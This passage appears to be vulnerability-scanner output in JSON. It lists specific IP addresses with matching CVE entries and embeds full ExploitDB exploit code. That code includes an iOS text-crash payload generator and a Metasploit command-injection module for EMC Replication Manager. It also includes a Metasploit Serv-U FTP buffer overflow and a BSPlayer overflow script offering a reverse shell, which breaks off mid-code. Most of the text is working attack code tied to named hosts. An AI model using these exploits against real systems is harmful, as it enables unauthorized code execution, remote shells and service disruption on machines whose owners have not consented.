                "description": "The mod_proxy module in the Apache HTTP Server 1.3.x through 1.3.42, 2.0.x through 2.0.64, and 2.2.x through 2.2.21, when the Revision 1179239 patch is in place, does not properly interact with use of (1) RewriteRule and (2) ProxyPassMatch pattern matches for configuration of a reverse proxy, which allows remote attackers to send requests to intranet servers via a malformed URI containing an @ (at sign) character and a : (colon) character in invalid positions.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2011-3368.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2011-4317"
                ],
                "msb": []
            }
        ]
    },
    "152.14.0.122": {
        "CVE-2017-7679": [
            {
                "source": "CVE",
                "_id": "2017-7679",
                "description": "In Apache httpd 2.2.x before 2.2.33 and 2.4.x before 2.4.26, mod_mime can read one byte past the end of a buffer when sending a malicious Content-Type response header.",
                "osvdb": [],
                "bid": [
                    99170
                ],
                "cve": [
                    "CVE-2017-7679"
                ],
                "msb": []
            },
            {
                "code": "# Exploit Title: TpwnT - iOS Denail of Service POC\r\n# Date: 10-31-2017\r\n# Exploit Author: Russian Otter (Ro)\r\n# Vendor Homepage: https://support.apple.com/en-us/HT208222\r\n# Version: 2.1\r\n# Tested on: iOS 10.3.2 - 11.1\r\n# CVE: CVE-2017-13849\r\n\r\n\"\"\"\r\n-------------------------\r\n     CVE-2017-13849\r\n  TpwnT by Ro of SavSec\r\n-------------------------\r\n\r\nDescription:\r\n\tThread Pwning Text (TpwnT) is maliciously crafted text that affects the iPhone and other Apple devices by exploiting a vulnerability found in the Core-Text firmware which results in a thread crash or extreme application lag!\r\n\r\nRecorded Tests / Results:\r\n\tSignal version 2.14.1 on iOS 10.3.2 (fixed on 2.15.3) users were able to crash conversations by sending the payload which would result in the app crashing when the selected chat was opened.\r\n\t\r\n\tInstagram version 10.25 (fixed on 10.31) on iOS 10.3.2 and resulting in chat thread crashes when the payload was sent which disallowed users to load chat or send messages. When the payload was unsent the chat was fuctional.\r\n\t\r\n\tPythonista 3 on iOS 10.3.2, crashed when displaying multiple sets of TpwnT or while rotating the device.\r\n\t\r\nSummary:\r\n\tWhen displaying the TpwnT Characters on iOS < 11.1 the iPhone may lag intensely or crash on certain apps!\r\n\tThis allows for the possibility of DoS related attacks or application crashing attacks.\r\n\r\nCreator: @Russian_Otter (Ro)\r\nDiscovery: 7-17-2017\r\nDisclosure: 10-31-2017\r\nDisclosure Page: https://support.apple.com/en-us/HT208222\r\n\r\nAffected Devices\r\n\tiPhone 5S iOS < 11.1\r\n\tiPhone 6 & 6S iOS < 11.1\r\n\tiPhone 7 iOS < 11.1\r\n\tiPhone 8 iOS < 11.1\r\n\tiPhone X iOS < 11.1\r\n\tApple TV 4th Generation\r\n\tApple TV 4K 4th Generation\r\n\tiPod Touch 6th Generation\r\n\tiPad Air\r\n\twatchOS < 4.1\r\n\ttvOS < 11.1\r\n\tiOS < 11.1\r\n\r\nTested Devices:\r\n\tiPhone 5S iOS 10.3.2 - 11.1\r\n\tiPhone 6S iOS 10.3.1 - 11.1\r\n\tiPad Mini 2 iOS 10.3.2\r\n\tApple TV 2 tvOS 10\r\n\r\nTested Apps:\r\n\tSignal\r\n\tInstagram\r\n\tSnapchat\r\n\tSafari\r\n\tTanktastic\r\n\tPythonista 3\r\n\tNotepad\r\n\r\n\"\"\"\r\n\r\ntpwnt = \"880 881 883 887 888 975 1159 1275 1276 1277 1278 1302 1304 1305 1306 1311 1313 1314 1316 1317 1318 1319 1322 1323 1324 1325 1326 1327 1328 1543 2304 2405 3073 3559 3585 3586 4091 4183 4184 4353 6366 6798 7679 7680 7837 7930 7932 7933 7934 7935 7936 8343 8344 8345 8346 8347 8348 8349 8376 8381 8382 8383 8384 8524 9136 9169 10215 10216 11153 11374 11377 11381 11390 11392 11746 11747 11748 11749 11750 11751 11752 11753 11754 11755 11756 11757 11758 11759 11760 11761 11762 11763 11764 11765 11766 11767 11768 11769 11771 11772 11773 11774 11775 11776 11811 11813 11814 12295 12344 12357 12686 19971 19975 42560 42562 42563 42564 42565 42566 42567 42568 42569 42570 42571 42572 42573 42574 42575 42576 42577 42578 42579 42580 42581 42583 42584 42585 42587 42588 42589 42590 42591 42592 42594 42595 42596 42597 42598 42599 42600 42601 42602 42603 42604 42605 42606 42608 42609 42610 42611 42612 42613 42614 42615 42616 42617 42619 42620 42621 42622 42623 42624 42625 42627 42628 42629 42630 42632 42633 42634\".split()\r\n\r\npayload = \"\"\r\nfor i in tpwnt:\r\n\ts = unichr(int(i))\r\n\tpayload += s\r\n\r\npayload = bytes(payload)\r\npayload_unicode = unicode(payload)\r\n\r\n# Proof of Concept\r\n# iOS < 11.1 Devices that display these characters should experience lag or crashes while TpwnT is visible\r\n\r\nif raw_input(\"Show Payload [y/n] \") == \"y\":\r\n\tprint payload_unicode",
                "description": "iOS < 11.1 / tvOS < 11.1 / watchOS < 4.1 - Denial of Service",
                "author": "Russian Otter",
                "_id": 43161,
                "source": "ExploitDB",
                "platform": "ios",
                "date": "2017-11-20T00:00:00+00:00",
                "cve": [
                    "CVE-2017-13849"
                ],
                "type": "dos",
                "port": 0
            }
        ]
    },
    "152.14.0.125": {},
    "152.14.20.32": {
        "CVE-2017-7679": [
            {
                "source": "CVE",
                "_id": "2017-7679",
                "description": "In Apache httpd 2.2.x before 2.2.33 and 2.4.x before 2.4.26, mod_mime can read one byte past the end of a buffer when sending a malicious Content-Type response header.",
                "osvdb": [],
                "bid": [
                    99170
                ],
                "cve": [
                    "CVE-2017-7679"
                ],
                "msb": []
            },
            {
                "code": "# Exploit Title: TpwnT - iOS Denail of Service POC\r\n# Date: 10-31-2017\r\n# Exploit Author: Russian Otter (Ro)\r\n# Vendor Homepage: https://support.apple.com/en-us/HT208222\r\n# Version: 2.1\r\n# Tested on: iOS 10.3.2 - 11.1\r\n# CVE: CVE-2017-13849\r\n\r\n\"\"\"\r\n-------------------------\r\n     CVE-2017-13849\r\n  TpwnT by Ro of SavSec\r\n-------------------------\r\n\r\nDescription:\r\n\tThread Pwning Text (TpwnT) is maliciously crafted text that affects the iPhone and other Apple devices by exploiting a vulnerability found in the Core-Text firmware which results in a thread crash or extreme application lag!\r\n\r\nRecorded Tests / Results:\r\n\tSignal version 2.14.1 on iOS 10.3.2 (fixed on 2.15.3) users were able to crash conversations by sending the payload which would result in the app crashing when the selected chat was opened.\r\n\t\r\n\tInstagram version 10.25 (fixed on 10.31) on iOS 10.3.2 and resulting in chat thread crashes when the payload was sent which disallowed users to load chat or send messages. When the payload was unsent the chat was fuctional.\r\n\t\r\n\tPythonista 3 on iOS 10.3.2, crashed when displaying multiple sets of TpwnT or while rotating the device.\r\n\t\r\nSummary:\r\n\tWhen displaying the TpwnT Characters on iOS < 11.1 the iPhone may lag intensely or crash on certain apps!\r\n\tThis allows for the possibility of DoS related attacks or application crashing attacks.\r\n\r\nCreator: @Russian_Otter (Ro)\r\nDiscovery: 7-17-2017\r\nDisclosure: 10-31-2017\r\nDisclosure Page: https://support.apple.com/en-us/HT208222\r\n\r\nAffected Devices\r\n\tiPhone 5S iOS < 11.1\r\n\tiPhone 6 & 6S iOS < 11.1\r\n\tiPhone 7 iOS < 11.1\r\n\tiPhone 8 iOS < 11.1\r\n\tiPhone X iOS < 11.1\r\n\tApple TV 4th Generation\r\n\tApple TV 4K 4th Generation\r\n\tiPod Touch 6th Generation\r\n\tiPad Air\r\n\twatchOS < 4.1\r\n\ttvOS < 11.1\r\n\tiOS < 11.1\r\n\r\nTested Devices:\r\n\tiPhone 5S iOS 10.3.2 - 11.1\r\n\tiPhone 6S iOS 10.3.1 - 11.1\r\n\tiPad Mini 2 iOS 10.3.2\r\n\tApple TV 2 tvOS 10\r\n\r\nTested Apps:\r\n\tSignal\r\n\tInstagram\r\n\tSnapchat\r\n\tSafari\r\n\tTanktastic\r\n\tPythonista 3\r\n\tNotepad\r\n\r\n\"\"\"\r\n\r\ntpwnt = \"880 881 883 887 888 975 1159 1275 1276 1277 1278 1302 1304 1305 1306 1311 1313 1314 1316 1317 1318 1319 1322 1323 1324 1325 1326 1327 1328 1543 2304 2405 3073 3559 3585 3586 4091 4183 4184 4353 6366 6798 7679 7680 7837 7930 7932 7933 7934 7935 7936 8343 8344 8345 8346 8347 8348 8349 8376 8381 8382 8383 8384 8524 9136 9169 10215 10216 11153 11374 11377 11381 11390 11392 11746 11747 11748 11749 11750 11751 11752 11753 11754 11755 11756 11757 11758 11759 11760 11761 11762 11763 11764 11765 11766 11767 11768 11769 11771 11772 11773 11774 11775 11776 11811 11813 11814 12295 12344 12357 12686 19971 19975 42560 42562 42563 42564 42565 42566 42567 42568 42569 42570 42571 42572 42573 42574 42575 42576 42577 42578 42579 42580 42581 42583 42584 42585 42587 42588 42589 42590 42591 42592 42594 42595 42596 42597 42598 42599 42600 42601 42602 42603 42604 42605 42606 42608 42609 42610 42611 42612 42613 42614 42615 42616 42617 42619 42620 42621 42622 42623 42624 42625 42627 42628 42629 42630 42632 42633 42634\".split()\r\n\r\npayload = \"\"\r\nfor i in tpwnt:\r\n\ts = unichr(int(i))\r\n\tpayload += s\r\n\r\npayload = bytes(payload)\r\npayload_unicode = unicode(payload)\r\n\r\n# Proof of Concept\r\n# iOS < 11.1 Devices that display these characters should experience lag or crashes while TpwnT is visible\r\n\r\nif raw_input(\"Show Payload [y/n] \") == \"y\":\r\n\tprint payload_unicode",
                "description": "iOS < 11.1 / tvOS < 11.1 / watchOS < 4.1 - Denial of Service",
                "author": "Russian Otter",
                "_id": 43161,
                "source": "ExploitDB",
                "platform": "ios",
                "date": "2017-11-20T00:00:00+00:00",
                "cve": [
                    "CVE-2017-13849"
                ],
                "type": "dos",
                "port": 0
            }
        ]
    },
    "152.14.29.4": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ],
        "CVE-2017-15906": [
            {
                "source": "CVE",
                "_id": "2017-15906",
                "description": "The process_open function in sftp-server.c in OpenSSH before 7.6 does not properly prevent write operations in readonly mode, which allows attackers to create zero-length files.",
                "osvdb": [],
                "bid": [
                    101552
                ],
                "cve": [
                    "CVE-2017-15906"
                ],
                "msb": []
            }
        ]
    },
    "152.14.29.156": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ],
        "CVE-2017-15906": [
            {
                "source": "CVE",
                "_id": "2017-15906",
                "description": "The process_open function in sftp-server.c in OpenSSH before 7.6 does not properly prevent write operations in readonly mode, which allows attackers to create zero-length files.",
                "osvdb": [],
                "bid": [
                    101552
                ],
                "cve": [
                    "CVE-2017-15906"
                ],
                "msb": []
            }
        ]
    },
    "152.14.29.157": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ],
        "CVE-2017-15906": [
            {
                "source": "CVE",
                "_id": "2017-15906",
                "description": "The process_open function in sftp-server.c in OpenSSH before 7.6 does not properly prevent write operations in readonly mode, which allows attackers to create zero-length files.",
                "osvdb": [],
                "bid": [
                    101552
                ],
                "cve": [
                    "CVE-2017-15906"
                ],
                "msb": []
            }
        ]
    },
    "152.14.29.220": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ],
        "CVE-2017-15906": [
            {
                "source": "CVE",
                "_id": "2017-15906",
                "description": "The process_open function in sftp-server.c in OpenSSH before 7.6 does not properly prevent write operations in readonly mode, which allows attackers to create zero-length files.",
                "osvdb": [],
                "bid": [
                    101552
                ],
                "cve": [
                    "CVE-2017-15906"
                ],
                "msb": []
            }
        ]
    },
    "152.14.66.222": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ]
    },
    "152.14.70.162": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ],
        "CVE-2016-1907": [
            {
                "source": "CVE",
                "_id": "2016-1907",
                "description": "The ssh_packet_read_poll2 function in packet.c in OpenSSH before 7.1p2 allows remote attackers to cause a denial of service (out-of-bounds read and application crash) via crafted network traffic.",
                "osvdb": [],
                "bid": [
                    81293
                ],
                "cve": [
                    "CVE-2016-1907"
                ],
                "msb": []
            }
        ]
    },
    "152.14.72.36": {
        "CVE-2011-5000": [
            {
                "source": "CVE",
                "_id": "2011-5000",
                "description": "The ssh_gssapi_parse_ename function in gss-serv.c in OpenSSH 5.8 and earlier, when gssapi-with-mic authentication is enabled, allows remote authenticated users to cause a denial of service (memory consumption) via a large value in a certain length field.  NOTE: there may be limited scenarios in which this issue is relevant.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2011-5000"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2011-4486",
                "description": "Cisco Unified Communications Manager (CUCM) with software 6.x and 7.x before 7.1(5b)su5, 8.0 before 8.0(3a)su3, and 8.5 and 8.6 before 8.6(2a)su1 and Cisco Business Edition 3000 with software before 8.6.3 and 5000 and 6000 with software before 8.6(2a)su1 allow remote attackers to cause a denial of service (device reload) via a crafted SCCP registration, aka Bug ID CSCtu73538.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2011-4486"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2011-2581",
                "description": "The ACL implementation in Cisco NX-OS 5.0(2) and 5.0(3) before 5.0(3)N2(1) on Nexus 5000 series switches, and NX-OS before 5.0(3)U1(2a) on Nexus 3000 series switches, does not properly handle comments in conjunction with deny statements, which allows remote attackers to bypass intended access restrictions in opportunistic circumstances by sending packets, aka Bug IDs CSCto09813 and CSCtr61490.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2011-2581"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2011-4487",
                "description": "SQL injection vulnerability in Cisco Unified Communications Manager (CUCM) with software 6.x and 7.x before 7.1(5b)su5, 8.0 before 8.0(3a)su3, and 8.5 and 8.6 before 8.6(2a)su1 and Cisco Business Edition 3000 with software before 8.6.3 and 5000 and 6000 with software before 8.6(2a)su1 allows remote attackers to execute arbitrary SQL commands via a crafted SCCP registration, aka Bug ID CSCtu73538.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2011-4487"
                ],
                "msb": []
            },
            {
                "code": "##\r\n# This module requires Metasploit: http://metasploit.com/download\r\n# Current source: https://github.com/rapid7/metasploit-framework\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass MetasploitModule < Msf::Exploit::Remote\r\n  Rank = GreatRanking\r\n\r\n  include Msf::Exploit::Remote::Tcp\r\n  include Msf::Exploit::CmdStager\r\n\r\n  def initialize(info = {})\r\n    super(update_info(info,\r\n      'Name'           => 'EMC Replication Manager Command Execution',\r\n      'Description'    => %q{\r\n        This module exploits a remote command-injection vulnerability in EMC Replication Manager\r\n        client (irccd.exe). By sending a specially crafted message invoking RunProgram function an\r\n        attacker may be able to execute arbitrary commands with SYSTEM privileges. Affected\r\n        products are EMC Replication Manager < 5.3. This module has been successfully tested\r\n        against EMC Replication Manager 5.2.1 on XP/W2003. EMC Networker Module for Microsoft\r\n        Applications 2.1 and 2.2 may be vulnerable too although this module have not been tested\r\n        against these products.\r\n      },\r\n      'Author'         =>\r\n        [\r\n          'Unknown', #Initial discovery\r\n          'Davy Douhine' #MSF module\r\n        ],\r\n      'License'        => MSF_LICENSE,\r\n      'References'     =>\r\n        [\r\n          [ 'CVE', '2011-0647' ],\r\n          [ 'OSVDB', '70853' ],\r\n          [ 'BID', '46235' ],\r\n          [ 'URL', 'http://www.securityfocus.com/archive/1/516260' ],\r\n          [ 'ZDI', '11-061' ]\r\n        ],\r\n      'DisclosureDate' => 'Feb 07 2011',\r\n      'Platform'       => 'win',\r\n      'Arch'           => ARCH_X86,\r\n      'Payload'        =>\r\n        {\r\n          'Space'       => 4096,\r\n          'DisableNops' => true\r\n        },\r\n      'Targets'        =>\r\n        [\r\n          # Tested on Windows XP and Windows 2003\r\n          [ 'EMC Replication Manager 5.2.1 / Windows Native Payload', { } ]\r\n        ],\r\n      'CmdStagerFlavor' => 'vbs',\r\n      'DefaultOptions' =>\r\n        {\r\n          'WfsDelay' => 5\r\n        },\r\n      'DefaultTarget'  => 0,\r\n      'Privileged'     => true\r\n      ))\r\n\r\n    register_options(\r\n      [\r\n        Opt::RPORT(6542)\r\n      ], self.class)\r\n  end\r\n\r\n  def exploit\r\n    execute_cmdstager({:linemax => 5000})\r\n  end\r\n\r\n  def execute_command(cmd, opts)\r\n    connect\r\n    hello = \"1HELLOEMC00000000000000000000000\"\r\n    vprint_status(\"Sending hello...\")\r\n    sock.put(hello)\r\n    result = sock.get_once || ''\r\n    if result =~ /RAWHELLO/\r\n      vprint_good(\"Expected hello response\")\r\n    else\r\n      disconnect\r\n      fail_with(Failure::Unknown, \"Failed to hello the server\")\r\n    end\r\n\r\n    start_session = \"EMC_Len0000000136<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><ir_message ir_sessionId=0000 ir_type=\\\"ClientStartSession\\\" <ir_version>1</ir_version></ir_message>\"\r\n    vprint_status(\"Starting session...\")\r\n    sock.put(start_session)\r\n    result = sock.get_once || ''\r\n    if result =~ /EMC/\r\n      vprint_good(\"A session has been created. Good.\")\r\n    else\r\n      disconnect\r\n      fail_with(Failure::Unknown, \"Failed to create the session\")\r\n    end\r\n\r\n    run_prog = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?> \"\r\n    run_prog << \"<ir_message ir_sessionId=\\\"01111\\\" ir_requestId=\\\"00000\\\" ir_type=\\\"RunProgram\\\" ir_status=\\\"0\\\"><ir_runProgramCommand>cmd /c #{cmd}</ir_runProgramCommand>\"\r\n    run_prog << \"<ir_runProgramAppInfo><?xml version=\"1.0\" encoding=\"UTF-8\"?> <ir_message ir_sessionId=\"00000\" ir_requestId=\"00000\" \"\r\n    run_prog << \"ir_type=\"App Info\" ir_status=\"0\"><IR_groupEntry IR_groupType=\"anywriter\"  IR_groupName=\"CM1109A1\"  IR_groupId=\"1\" \"\r\n    run_prog << \"><?xml version=\"1.0\" encoding=\"UTF-8\"?\t> <ir_message ir_sessionId=\"00000\" \"\r\n    run_prog << \"ir_requestId=\"00000\"ir_type=\"App Info\" ir_status=\"0\"><aa_anywriter_ccr_node>CM1109A1\"\r\n    run_prog << \"</aa_anywriter_ccr_node><aa_anywriter_fail_1018>0</aa_anywriter_fail_1018><aa_anywriter_fail_1019>0\"\r\n    run_prog << \"</aa_anywriter_fail_1019><aa_anywriter_fail_1022>0</aa_anywriter_fail_1022><aa_anywriter_runeseutil>1\"\r\n    run_prog << \"</aa_anywriter_runeseutil><aa_anywriter_ccr_role>2</aa_anywriter_ccr_role><aa_anywriter_prescript>\"\r\n    run_prog << \"</aa_anywriter_prescript><aa_anywriter_postscript></aa_anywriter_postscript><aa_anywriter_backuptype>1\"\r\n    run_prog << \"</aa_anywriter_backuptype><aa_anywriter_fail_447>0</aa_anywriter_fail_447><aa_anywriter_fail_448>0\"\r\n    run_prog << \"</aa_anywriter_fail_448><aa_exchange_ignore_all>0</aa_exchange_ignore_all><aa_anywriter_sthread_eseutil>0&amp\"\r\n    run_prog << \";lt;/aa_anywriter_sthread_eseutil><aa_anywriter_required_logs>0</aa_anywriter_required_logs><aa_anywriter_required_logs_path\"\r\n    run_prog << \"></aa_anywriter_required_logs_path><aa_anywriter_throttle>1</aa_anywriter_throttle><aa_anywriter_throttle_ios>300\"\r\n    run_prog << \"</aa_anywriter_throttle_ios><aa_anywriter_throttle_dur>1000</aa_anywriter_throttle_dur><aa_backup_username>\"\r\n    run_prog << \"</aa_backup_username><aa_backup_password></aa_backup_password><aa_exchange_checksince>1335208339\"\r\n    run_prog << \"</aa_exchange_checksince> </ir_message></IR_groupEntry> </ir_message></ir_runProgramAppInfo>\"\r\n    run_prog << \"<ir_applicationType>anywriter</ir_applicationType><ir_runProgramType>backup</ir_runProgramType> </ir_message>\"\r\n    run_prog_header = \"EMC_Len000000\"\r\n    run_prog_packet = run_prog_header + run_prog.length.to_s + run_prog\r\n\r\n    vprint_status(\"Executing command....\")\r\n    sock.put(run_prog_packet)\r\n    sock.get_once(-1, 1)\r\n\r\n    end_string = Rex::Text.rand_text_alpha(rand(10)+32)\r\n    sock.put(end_string)\r\n    sock.get_once(-1, 1)\r\n    disconnect\r\n\r\n  end\r\nend",
                "description": "EMC Replication Manager < 5.3 - Command Execution (Metasploit)",
                "author": "Metasploit",
                "_id": 41704,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-02-27T00:00:00+00:00",
                "cve": [],
                "type": "local",
                "port": 0
            },
            {
                "code": "##\r\n# $Id$\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n# http://metasploit.com/framework/\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = NormalRanking\r\n\r\n\tinclude Msf::Exploit::Remote::Egghunter\r\n\tinclude Msf::Exploit::Remote::Ftp\r\n\r\n\tdef initialize(info = {})\r\n\t\tsuper(update_info(info,\r\n\t\t\t'Name'           => 'Serv-U FTP Server <4.2 Buffer Overflow',\r\n\t\t\t'Description'    => %q{\r\n\t\t\t\tThis module exploits a stack buffer overflow in the site chmod command\r\n\t\t\t\tin versions of Serv-U FTP Server prior to 4.2.\r\n\r\n\t\t\t\tYou must have valid credentials to trigger this vulnerability. Exploitation\r\n\t\t\t\talso leaves the service in a non-functional state.\r\n\t\t\t},\r\n\t\t\t'Author'         => 'thelightcosine <thelightcosine[at]metasploit.com>',\r\n\t\t\t'License'        => MSF_LICENSE,\r\n\t\t\t'Version'        => '$Revision$',\r\n\t\t\t'References'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ 'CVE', '2004-2111'],\r\n\t\t\t\t\t[ 'BID', '9483'],\r\n\t\t\t\t],\r\n\t\t\t'Privileged'     => true,\r\n\t\t\t'DefaultOptions' =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'EXITFUNC' => 'thread',\r\n\t\t\t\t},\r\n\t\t\t'Payload'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'BadChars'    => \"\\x00\\x7e\\x2b\\x26\\x3d\\x25\\x3a\\x22\\x0a\\x0d\\x20\\x2f\\x5c\\x2e\",\r\n\t\t\t\t\t'DisableNops' => true,\r\n\t\t\t\t},\r\n\t\t\t'Platform'       => 'win',\r\n\t\t\t'Targets'        =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ 'Windows 2000 SP0-4 EN', {\r\n\t\t\t\t\t\t'Ret'    => 0x750212bc, #WS2HELP.DLL\r\n\t\t\t\t\t\t'Offset' => 396 } ],\r\n\t\t\t\t\t[ 'Windows XP SP0-1 EN', {\r\n\t\t\t\t\t\t'Ret'    => 0x71aa388f, #WS2HELP.DLL\r\n\t\t\t\t\t\t'Offset' => 394 } ]\r\n\t\t\t\t],\r\n\t\t\t'DisclosureDate' => 'Dec 31 2004',\r\n\t\t\t'DefaultTarget'  => 0))\r\n\tend\r\n\r\n\tdef check\r\n\t\tconnect\r\n\t\tdisconnect\r\n\r\n\t\tif (banner =~ /Serv-U FTP Server v((4.(0|1))|3.\\d)/)\r\n\t\t\treturn Exploit::CheckCode::Vulnerable\r\n\t\tend\r\n\t\t\treturn Exploit::CheckCode::Safe\r\n\tend\r\n\r\n\r\n\tdef exploit\r\n\t\tconnect_login\r\n\r\n\t\teggoptions =\r\n\t\t{\r\n\t\t\t:checksum => true,\r\n\t\t\t:eggtag => \"W00T\"\r\n\t\t}\r\n\r\n\t\thunter,egg = generate_egghunter(payload.encoded,payload_badchars,eggoptions)\r\n\r\n\r\n\t\tbuffer = \"chmod 777 \"\r\n\t\tbuffer <<  make_nops(target['Offset'] - egg.length - hunter.length)\r\n\t\tbuffer << egg\r\n\t\tbuffer << hunter\r\n\t\tbuffer << \"\\xeb\\xc9\\x41\\x41\"\t#nseh, jump back to egghunter\r\n\t\tbuffer << [target.ret].pack('V')\t#seh\r\n\t\tbuffer << rand_text(5000)\r\n\r\n\t\tprint_status(\"Trying target #{target.name}...\")\r\n\r\n\t\tsend_cmd( ['SITE', buffer] , false)\r\n\r\n\t\thandler\r\n\t\tdisconnect\r\n\tend\r\n\r\nend",
                "description": "RhinoSoft Serv-U FTPd Server < 4.2 - Remote Buffer Overflow (Metasploit)",
                "author": "Metasploit",
                "_id": 18190,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-12-02T00:00:00+00:00",
                "cve": [],
                "type": "remote",
                "port": 0
            },
            {
                "code": "#\r\n#\r\n#[+]Exploit Title: Exploit Buffer Overfloe Bsplayer 2.57(UNICODE-SEH)\r\n#[+]Date: 01\\07\\2010\r\n#[+]Author: C4SS!0 G0M3S\r\n#[+]Software Link: http://www.bsplayer.com/services/downlad-free-bsplayer.php?type=2\r\n#[+]Version: 2.57\r\n#[+]Tested on: WIN-XP SP3 PORTUGUESE BRAZILIAN\r\n#[+]CVE: N/A\r\n#\r\n#\r\n#  #########      ##   #########      #########  ##     ###############\r\n#  #########    ####   #########      #########  ##     ##           ##    \r\n#  ##         ## ##    ##             ##         ##     ##           ## \r\n#  ##        ##  ##    ##             ##         ##     ##           ##\r\n#  ##       ########## ########       ########   ##     ##           ##\r\n#  ##            ##          ##             ##   ##     ##           ##\r\n#  ##            ##          ##             ##   ##     ##           ##\r\n#  ########      ##    ########      #########   ##     ##           ##\r\n#  ########      ##    ########      #########   \\/     ###############\r\n#                                              \r\n#Created By C4SS!0 G0M3S\r\n#Louredo_@hotmail.com\r\n#www.invasao.com.br\r\n#\r\n#\r\n\r\n\r\nimport os\r\nimport sys\r\nimport time\r\nimport string\r\n\r\nos.system(\"cls\")\r\nos.system(\"color 4f\")\r\n\r\ndef usage():\r\n        print \"\\n\"\r\n        print \"[+]Exploit: Exploit Buffer Overflow Bsplayer(UNICODE-SEH)\"\r\n        print \"[+]Date: 01\\\\07\\\\2010\"\r\n        print \"[+]Author: C4SS!0 G0M3S\"\r\n        print \"[+]Home: www.invasao.com.br\"\r\n        print \"[+]E-mail: Louredo_@hotmail.com\"\r\n        print \"[+]Version: 2.57\"\r\n        print \"[+]Software: Bsplayer 2.57\\n\"\r\n        print \"[-]Note:\"\r\n        print \"TO EXPLOIT THE RUN FILE NAME MUST BE FILE_NAME.M3U\\n\"\r\n\r\n\r\nif((len(sys.argv)!=3) or (int(sys.argv[1])<1) or (int(sys.argv[1])>2)):\r\n        usage()\r\n        print \"Payloads:\\n1 - WinExec(\\\"Calc.exe\\\",0)\\n2 - Reverse_Tcp_Shell\\n\"\r\n        print \"[-]Usage: \"+sys.argv[0]+\" <Playload Number> <File Name>\"\r\n        print \"[-]Exemple: \"+sys.argv[0]+\" 1 Exploit.m3u\"\r\n        sys.exit(0)\r\n\r\nusage()\r\nbuffer = \"\\x42\" * 4102\r\nnseh = \"\\x61\\x6d\"\r\nseh = \"\\xde\\x4e\" #pop ebx - pop ebp - ret at 0x004E00DE [bsplayer.exe]\r\negg_hunter = \"\\x45\\x61\\x45\\x61\\x45\\x50\\x45\\xc3\"\r\n\r\njunk = \"\\x45\" * 1094\r\nprint \"[*]Identifying the length Shellcode\"\r\ntime.sleep(1)\r\nif int(sys.argv[1]) == 2:\r\n\tshellcode = 